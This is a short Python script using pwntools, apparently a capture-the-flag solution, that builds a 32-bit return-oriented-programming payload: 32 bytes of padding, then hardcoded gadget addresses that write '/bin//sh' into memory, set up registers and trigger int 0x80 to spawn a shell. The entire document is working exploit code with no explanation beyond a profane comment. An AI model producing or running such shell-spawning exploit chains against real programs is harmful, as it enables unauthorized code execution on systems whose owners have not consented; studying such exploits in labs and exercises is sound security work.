# exactly the same as my approach, but uses edx instead of eax, because there's a fucking pop edx gadget!


from pwn import *

payload = b"a" * 32

pop_edx = 0x555f3555
memory_addr = 0x55562023
mov_edx_edi = 0x55687b3c
mov_edx_eax = 0x5560645c
pop_ecx = 0x556d2a51
pop_ebx = 0x5557734e
inc_eax = 0x556c6864
int_80 = 0x55667176

payload += p32(pop_edx) \
           + p32(memory_addr) \
           + b'/bin' \

payload += p32(mov_edx_edi) \
           + b'aaaaaaaa' \

payload += p32(pop_edx) \
           + p32(memory_addr + 4) \
           + b'//sh' \

payload += p32(mov_edx_edi) \
           + b'aaaaaaaa' \

payload += p32(pop_edx) \
           + p32(memory_addr + 8) \
           + b'aaaa' \

payload += p32(mov_edx_eax) \
           + p32(pop_edx) \
           + p32(memory_addr + 8) \
           + b'aaaa' \

payload += p32(pop_ecx) \
           + p32(memory_addr + 8) \
           + p32(pop_ebx) \
           + p32(memory_addr) \
           + p32(inc_eax) \
           + p32(int_80)

print(payload)
